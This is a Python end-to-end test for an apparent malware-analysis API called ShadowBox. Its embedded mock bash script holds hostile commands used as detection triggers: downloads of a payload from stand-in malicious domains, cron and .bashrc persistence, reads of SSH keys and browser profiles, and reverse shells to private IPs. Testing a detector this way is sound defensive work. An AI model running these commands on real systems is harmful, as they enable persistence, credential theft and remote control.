import asyncio
import httpx
import os
import time

API_URL = "http://127.0.0.1:8000/api"

MOCK_SCRIPT = """#!/bin/bash
# ShadowBox E2E Test Script

# Downloader intent triggers
curl http://malicious-domain.com/payload.sh -o /tmp/payload.sh
wget http://backup-domain.net/stealer.py

# File operation / permission changes
chmod +x /tmp/payload.sh

# Persistence triggers
crontab -l | { cat; echo "* * * * * /tmp/payload.sh"; } | crontab -
echo "python3 /tmp/payload.sh &" >> ~/.bashrc

# Credential theft triggers
cat ~/.ssh/id_rsa
cat ~/.mozilla/firefox/profiles.ini

# Remote C2 / Reverse shell triggers
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/sh 192.168.1.100 8888
"""

async def test_flow():
    # 1. Create the mock script file
    script_path = "test_malicious.sh"
    with open(script_path, "w") as f:
        f.write(MOCK_SCRIPT)
    print(f"Created temporary script: {script_path}")

    async with httpx.AsyncClient(timeout=60) as client:
        # 2. Upload the file to analyze
        print("Uploading file to ShadowBox...")
        with open(script_path, "rb") as f:
            files = {"file": (script_path, f, "application/x-sh")}
            response = await client.post(f"{API_URL}/analyze", files=files)
        
        if response.status_code != 200:
            print(f"Upload failed: {response.status_code} - {response.text}")
            os.remove(script_path)
            return

        res_data = response.json()
        analysis_id = res_data["analysis_id"]
        print(f"Analysis accepted. ID: {analysis_id}")

        # 3. Poll for the analysis result
        print("Polling analysis result...")
        for attempt in range(45):
            await asyncio.sleep(1)
            res = await client.get(f"{API_URL}/analysis/{analysis_id}")
            if res.status_code != 200:
                print(f"Failed to fetch analysis: {res.text}")
                break
            
            data = res.json()
            status = data["status"]
            print(f"Attempt {attempt+1}: status is '{status}'")
            if status in ("completed", "error"):
                break
        
        # 4. Display result
        res = await client.get(f"{API_URL}/analysis/{analysis_id}")
        data = res.json()
        
        print("\n================== ANALYSIS RESULT ==================")
        print(f"Filename: {data['filename']}")
        print(f"Status: {data['status']}")
        print(f"Risk Score: {data['risk_score']} / 100")
        print(f"Risk Level: {data['risk_level'].upper()}")
        
        print("\n--- DETECTED INTENTS ---")
        for intent in data.get("intents", []):
            if intent["score"] > 0:
                print(f"- {intent['category']}: {intent['score']}/100")
                for reason in intent["reasons"]:
                    print(f"  • {reason}")

        print("\n--- CONSEQUENCES ---")
        for c in data.get("consequences", []):
            print(f"- [{c['severity']}] {c['observation']}: {c['consequence']}")

        print("\n--- ATTACK CHAIN ---")
        chain = data.get("attack_chain", {})
        print(f"Nodes: {len(chain.get('nodes', []))}")
        print(f"Edges: {len(chain.get('edges', []))}")
        for node in chain.get("nodes", []):
            label = node['label'].replace("→", "->")
            try:
                print(f"  Node {node['id']}: [{node['type']}] {label}")
            except UnicodeEncodeError:
                print(f"  Node {node['id']}: [{node['type']}] {label.encode('ascii', 'ignore').decode('ascii')}")

        print("\n--- AI NARRATOR SUMMARY ---")
        narrative = data.get("narrative")
        if narrative:
            print(f"Provider: {narrative['provider']}")
            print(f"Summary:\n{narrative['summary']}")
        else:
            print("No narrative generated.")
        print("=====================================================")

    # Cleanup
    os.remove(script_path)
    print("Cleaned up temporary script file.")

if __name__ == "__main__":
    asyncio.run(test_flow())
